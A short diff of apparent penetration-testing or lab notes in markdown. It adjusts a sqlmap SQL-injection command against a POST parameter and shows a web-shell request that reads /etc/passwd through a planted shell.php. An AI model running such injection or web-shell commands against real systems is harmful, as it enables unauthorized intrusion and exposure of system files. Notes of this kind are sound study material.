@@ -43,7 +43,7 @@
   - > __```<url>/shell.php?cmd=cat /etc/passwd```__
 ## sqlmap 
 
-- __`sqlmap -u "<url>" --data "words_exact" -p words_exact --method POST`__
+- __`sqlmap -u "<url>" --data "words_exact=" -p words_exact --method POST`__
 - __OR__
 ![image2](Image/sqlmap.png)
 - __Save the above post request in a file `request`__
